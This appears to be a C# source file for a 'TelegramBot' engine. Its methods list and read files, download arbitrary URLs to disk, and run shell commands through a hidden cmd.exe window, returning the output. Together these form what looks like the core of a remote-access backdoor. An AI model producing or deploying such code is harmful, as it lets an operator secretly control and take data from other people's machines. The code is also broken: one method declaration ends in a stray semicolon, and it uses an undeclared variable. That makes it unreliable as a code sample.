using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.IO;
using System.Net;

namespace TelegramBot
{
    public class BotEngine
    {
        public List<string> Get();
        {
            List<string> files = new List<string>();

            Directory
                .GetFiles(path)
                .ToList()
                .ForEach(f => files.Add(f));

            return files;
        }

        public string Read(string path)
        {
            string fileText;
            fileText = File.ReadAllText(path);
            return fileText;
        }

        public bool Dowload(string address, string path)
        {
            using (var client = new WebClient())
            {
                client.DownloadFile(address, path);
            }

            return true;
        }

        public string Command(string command)
        {
            ProcessStartInfo request = new ProcessStartInfo(@"cmd.exe", @"/C " + command);
            request.WindowStyle = ProcessWindowStyle.Hidden;
            request.RedirectStandardOutput = true;
            request.UseShellExecute = false;
            request.CreateNoWindow = true;
            Process procCommand = Process.Start(request);
            StreamReader answer = procCommand.StandardOutput;
            return answer.ReadToEnd();
        }
        
    }
}